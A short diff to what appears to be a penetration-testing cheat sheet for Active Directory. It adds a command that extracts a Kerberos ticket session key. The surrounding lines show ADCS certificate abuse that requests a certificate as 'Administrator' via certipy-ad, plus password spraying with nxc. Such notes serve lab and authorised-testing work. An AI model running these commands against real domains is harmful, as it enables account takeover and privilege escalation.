@@ -426,8 +426,9 @@ certipy-ad find -dc-ip $TARGET -target $DC -u '$USERNAME' -p '$PASSWORD' -vulner
 certipy-ad req -dc-ip $TARGET -target $DC -u '$USERNAME' -p '$PASSWORD' -ca '$CA' -upn 'Administrator' -template 'RetroClients' -key-size '4096'
 
 [*] (88) Kerberos
-+---------- Storing .ccache ----------+
++---------- .Ccache ----------+
 export KRB5CCNAME="$PWD/$USERNAME.ccache"; chmod 0600 "$KRB5CCNAME"
+impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs
 
 +---------- Kerberos Negotiation ----------+
 nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success -k
